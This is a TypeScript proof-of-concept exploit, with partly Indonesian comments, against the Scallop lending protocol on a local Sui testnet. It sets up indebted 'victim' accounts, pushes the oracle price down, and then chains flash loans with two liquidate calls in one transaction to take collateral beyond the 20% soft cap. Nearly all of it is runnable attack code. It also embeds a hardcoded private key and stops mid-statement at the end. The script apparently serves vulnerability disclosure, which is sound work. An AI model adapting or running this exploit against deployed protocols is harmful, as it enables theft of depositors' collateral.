// @ts-nocheck
/**
 * PoC: Multi-Call Liquidation Bypasses 20% Soft Cap
 * Target: Scallop Protocol (Local Testnet)
 * SDK: @mysten/sui (Official)
 */

import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';

const client = new SuiClient({ url: 'http://127.0.0.1:9000' });

// ==================== KONFIGURASI LOCAL TESTNET ====================
const PKG = "0xc2e9aebe7fcfbd4c4a6aa49a387fe33817f41f0bf70873100b4f12ad3168b670";
const VERSION = "0x531afe6c8abf6d50c14b3aae70a6720d1323a50d4e8c5eecf642b921762b9b81";
const MARKET = "0x078ba677e7d9090a1a2d925377d5806534591446ce7916c65399dd4ead992962";
const ORACLE = "0x397ec083471276c9245bf23ad51cbf526784584cb68053f216a1513f3e37d677";
const REGISTRY = "0x4a5de23a9ce5624377ac5ac2dc3e89d9d183dec31d06cee6f0a98519fdf3b01f";
const CLOCK = "0x6";

const TEST_COIN_PKG = "0x825fbeb93ed12fed3058db59adced82b503d8468b603498418bf21a63230fc84";
const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
const SUI_TYPE = "0x2::sui::SUI";

const USDC_TREASURY = "0x4e1a61e4f32731de824371748eaf58887a147eaded9845692ae3916c6a6b0aee";
const ETH_TREASURY = "0x1702fa3e0c15291ef0667bffad8ff36c9424686d1a3e6edc976076ff8e3c0681";

// PRIVATE KEY FUNDER
const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
const funderAddress = funderKeypair.getPublicKey().toSuiAddress();

console.log(`[INIT] Funder Address: ${funderAddress}`);

// ==================== HELPER FUNCTIONS ====================

async function executeTx(tx: Transaction, keypair: Ed25519Keypair) {
    tx.setSender(keypair.getPublicKey().toSuiAddress());
    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        options: { showEffects: true, showObjectChanges: true }
    });
    await new Promise(r => setTimeout(r, 1500)); // Jeda 1.5 detik
    return result;
}

async function printBalances(address: string) {
    const suiBalance = await client.getBalance({ owner: address, coinType: SUI_TYPE });
    const usdcBalance = await client.getBalance({ owner: address, coinType: USDC_TYPE });
    const ethBalance = await client.getBalance({ owner: address, coinType: ETH_TYPE });
    console.log(
        `[DEBUG] Balances for ${address.slice(0, 8)}...: ` +
        `SUI=${Number(suiBalance.totalBalance) / 1e9} | ` +
        `USDC=${Number(usdcBalance.totalBalance) / 1e9} | ` +
        `ETH=${Number(ethBalance.totalBalance) / 1e9}`
    );
}

async function readObligationState(obligationId: string) {
    const fields = await client.getDynamicFields({ parentId: obligationId });
    let collateralAmount = 0n, debtUSDC = 0n, debtETH = 0n;
    for (const field of fields.data) {
        const fieldData = await client.getDynamicFieldObject({ parentId: obligationId, name: field.name });
        const fieldName = JSON.stringify(field.name);
        const fieldValue = fieldData?.data?.content?.fields;
        if (fieldName.includes("Collateral") && fieldValue) {
            collateralAmount = BigInt(fieldValue.amount || 0);
        } else if (fieldName.includes("Debt") && fieldValue) {
            if (fieldName.includes("USDC")) debtUSDC = BigInt(fieldValue.amount || 0);
            else if (fieldName.includes("ETH")) debtETH = BigInt(fieldValue.amount || 0);
        }
    }
    return { collateralAmount, debtUSDC, debtETH };
}

// ==================== PHASE 1: SETUP VICTIM ====================

async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
    const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
    console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);

    // --- STEP 1: Fund victim dengan 1010 SUI ---
    // Gunakan bigint langsung — SDK melakukan auto-coerce untuk splitCoins
    // dan string langsung untuk transferObjects address
    const fundTx = new Transaction();
    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
    fundTx.transferObjects([suiCoin], victimAddr); // string address di-coerce otomatis
    await executeTx(fundTx, funderKeypair);
    console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);

    // --- STEP 2: Open Obligation menggunakan open_obligation_entry ---
    // FIX UTAMA: Gunakan fungsi entry alih-alih hot potato flow.
    // Fungsi entry menangani sharing obligation secara internal,
    // sehingga tidak ada TypeMismatch dari passing hot potato antar command.
    const openTx = new Transaction();
    openTx.moveCall({
        target: `${PKG}::open_obligation::open_obligation_entry`,
        arguments: [openTx.object(VERSION)],
    });
    const openResult = await executeTx(openTx, victimKeypair);
    console.log(`[${label}] Step 2 done: Obligation opened`);

    // Ambil obligationId dan obligationKeyId dari objectChanges
    let obligationId = "";
    let obligationKeyId = "";
    for (const obj of openResult.objectChanges || []) {
        if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) {
            obligationId = obj.objectId;
        }
        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) {
            obligationKeyId = obj.objectId;
        }
    }

    if (!obligationId || !obligationKeyId) {
        throw new Error(`[${label}] Failed to find obligationId or obligationKeyId in objectChanges`);
    }
    console.log(`[${label}] Obligation ID: ${obligationId}`);
    console.log(`[${label}] ObligationKey ID: ${obligationKeyId}`);

    // --- STEP 3: Deposit SUI Collateral ---
    // Split langsung dari gas dalam PTB yang sama.
    // Hasil splitCoins adalah TransactionArgument — langsung pakai tanpa tx.object()
    const depositTx = new Transaction();
    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]); // 1000 SUI
    depositTx.moveCall({
        target: `${PKG}::deposit_collateral::deposit_collateral`,
        typeArguments: [SUI_TYPE],
        arguments: [
            depositTx.object(VERSION),
            depositTx.object(obligationId),
            depositTx.object(MARKET),
            collateralCoin, // ✅ TransactionArgument langsung, bukan tx.object()
        ],
    });
    await executeTx(depositTx, victimKeypair);
    console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);

    // --- STEP 4: Mint & Supply USDC & ETH ke Market ---
    // Gunakan tx.pure.u64() untuk semua argumen numerik di moveCall
    const supplyTx = new Transaction();

    const [usdcCoin] = supplyTx.moveCall({
        target: `${TEST_COIN_PKG}::usdc::mint`,
        arguments: [
            supplyTx.object(USDC_TREASURY),
            supplyTx.pure.u64(100_000_000_000_000n), // ✅ tx.pure.u64()
        ],
    });
    const [sUSDC] = supplyTx.moveCall({
        target: `${PKG}::mint::mint`,
        typeArguments: [USDC_TYPE],
        arguments: [
            supplyTx.object(VERSION),
            supplyTx.object(MARKET),
            usdcCoin, // ✅ TransactionArgument langsung
            supplyTx.object(CLOCK),
        ],
    });
    supplyTx.moveCall({
        target: `0x2::coin::destroy_zero`,
        typeArguments: [`${PKG}::reserve::MarketCoin<${USDC_TYPE}>`],
        arguments: [sUSDC],
    });

    const [ethCoin] = supplyTx.moveCall({
        target: `${TEST_COIN_PKG}::eth::mint`,
        arguments: [
            supplyTx.object(ETH_TREASURY),
            supplyTx.pure.u64(10_000_000_000n), // ✅ tx.pure.u64()
        ],
    });
    const [sETH] = supplyTx.moveCall({
        target: `${PKG}::mint::mint`,
        typeArguments: [ETH_TYPE],
        arguments: [
            supplyTx.object(VERSION),
            supplyTx.object(MARKET),
            ethCoin, // ✅ TransactionArgument langsung
            supplyTx.object(CLOCK),
        ],
    });
    supplyTx.moveCall({
        target: `0x2::coin::destroy_zero`,
        typeArguments: [`${PKG}::reserve::MarketCoin<${ETH_TYPE}>`],
        arguments: [sETH],
    });

    await executeTx(supplyTx, funderKeypair);
    console.log(`[${label}] Step 4 done: Minted & supplied USDC and ETH to market`);

    // --- STEP 5: Borrow USDC (500 USDC = 500_000_000 dengan 6 desimal) ---
    const borrowUSDCTx = new Transaction();
    const [borrowedUSDC] = borrowUSDCTx.moveCall({
        target: `${PKG}::borrow::borrow`,
        typeArguments: [USDC_TYPE],
        arguments: [
            borrowUSDCTx.object(VERSION),
            borrowUSDCTx.object(obligationId),
            borrowUSDCTx.object(obligationKeyId),
            borrowUSDCTx.object(MARKET),
            borrowUSDCTx.object(REGISTRY),
            borrowUSDCTx.pure.u64(500_000_000n), // ✅ tx.pure.u64()
            borrowUSDCTx.object(ORACLE),
            borrowUSDCTx.object(CLOCK),
        ],
    });
    borrowUSDCTx.transferObjects([borrowedUSDC], victimAddr);
    await executeTx(borrowUSDCTx, victimKeypair);
    console.log(`[${label}] Step 5 done: Borrowed 500 USDC`);

    // --- STEP 6: Borrow ETH (0.2 ETH = 200_000_000 dengan 9 desimal) ---
    const borrowETHTx = new Transaction();
    const [borrowedETH] = borrowETHTx.moveCall({
        target: `${PKG}::borrow::borrow`,
        typeArguments: [ETH_TYPE],
        arguments: [
            borrowETHTx.object(VERSION),
            borrowETHTx.object(obligationId),
            borrowETHTx.object(obligationKeyId),
            borrowETHTx.object(MARKET),
            borrowETHTx.object(REGISTRY),
            borrowETHTx.pure.u64(200_000_000n), // ✅ tx.pure.u64()
            borrowETHTx.object(ORACLE),
            borrowETHTx.object(CLOCK),
        ],
    });
    borrowETHTx.transferObjects([borrowedETH], victimAddr);
    await executeTx(borrowETHTx, victimKeypair);
    console.log(`[${label}] Step 6 done: Borrowed 0.2 ETH`);

    console.log(`[${label}] ✅ Setup complete. Obligation ID: ${obligationId}`);
    return { obligationId, obligationKeyId };
}

// ==================== PHASE 2: TRIGGER (MANIPULASI ORACLE) ====================

async function crashOraclePrice() {
    console.log("\n[TRIGGER] Crashing SUI price to $0.40 via Oracle Update...");
    const tx = new Transaction();
    tx.moveCall({
        target: `${PKG}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [
            tx.object(ORACLE),
            tx.object(CLOCK),
            tx.pure.u64(40_000_000n), // ✅ tx.pure.u64()
        ],
    });
    await executeTx(tx, funderKeypair);
    console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
}

// ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================

async function beforeExploit_singleCall(victimObligationId: string) {
    console.log("\n" + "=".repeat(60));
    console.log("BEFORE EXPLOIT: Single Liquidation Call");
    console.log("=".repeat(60));

    const stateBefore = await readObligationState(victimObligationId);
    console.log(`[BEFORE] Collateral SUI: ${stateBefore.collateralAmount}`);

    const tx = new Transaction();

    // Borrow flash loan USDC
    const [flashUSDC, flashReceipt] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(MARKET),
            tx.pure.u64(50_000_000_000n), // ✅ tx.pure.u64()
        ],
    });

    // Liquidate dengan USDC, ambil SUI collateral
    const [remainUSDC, collateralCoin] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(victimObligationId),
            tx.object(MARKET),
            flashUSDC, // ✅ TransactionArgument langsung
            tx.object(REGISTRY),
            tx.object(ORACLE),
            tx.object(CLOCK),
        ],
    });

    // Repay flash loan
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(MARKET),
            remainUSDC, // ✅ TransactionArgument langsung
            flashReceipt,
        ],
    });

    tx.transferObjects([collateralCoin], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);

    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[BEFORE] Single-call extracted: ${extracted} SUI (Expected: ~20% cap)`);
    return { extracted };
}

// ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================

async function afterExploit_multiCall(victimObligationId: string) {
    console.log("\n" + "=".repeat(60));
    console.log("AFTER EXPLOIT: Multi-Call Liquidation");
    console.log("=".repeat(60));

    const stateBefore = await readObligationState(victimObligationId);

    const tx = new Transaction();

    // Borrow dua flash loan sekaligus dalam satu PTB
    const [f_USDC, r_USDC] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
    });
    const [f_ETH, r_ETH] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)],
    });

    // Liquidasi pertama dengan USDC
    const [rem1, c1] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(victimObligationId),
            tx.object(MARKET),
            f_USDC,
            tx.object(REGISTRY),
            tx.object(ORACLE),
            tx.object(CLOCK),
        ],
    });

    // Liquidasi kedua dengan ETH — bypass 20% cap!
    const [rem2, c2] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [ETH_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(victimObligationId),
            tx.object(MARKET),
            f_ETH,
            tx.object(REGISTRY),
            tx.object(ORACLE),
            tx.object(CLOCK),
        ],
    });

    // Repay kedua flash loan
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC],
    });
    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH],
    });

    // Gabungkan collateral dan transfer ke funder
    tx.mergeCoins(c1, [c2]);
    tx.transferObjects([c1], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);

    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[AFTER] Multi-call extracted: ${extracted} SUI (BYPASSED 20% cap!)`);
    return { extracted };
}

// ==================== MAIN EXECUTION ====================

async function main() {
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");

    console.log("\n[DEBUG] Checking Funder Balances...");
    await printBalances(funderAddress);

    const victimA = Ed25519Keypair.generate();
    const victimB = Ed25519Keypair.generate();

    const vA = await setupVictim(victimA, "VICTIM A");
    const vB = await setupVictim(victimB, "VICTIM B");

    await crashOraclePrice();

    console.log("\n[DEBUG] Checking Funder Balances before Exploits...");
    await printBalances(funderAddress);

    const beforeResult = await beforeExploit_singleCall(vA.obligationId);
    const afterResult = await afterExploit_multiCall(vB.obligationId);

    console.log("\n" + "=".repeat(60));
    console.log("FINAL IMPACT ANALYSIS");
    console.log("=".repeat(60));
    console.log(`Single-Call Extracted : ${beforeResult.extracted} SUI`);
    console.log(`Multi-Call Extracted  : ${afterResult.extracted} SUI`);

    if (beforeResult.extracted > 0n) {
        const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
        console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
    }
    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`
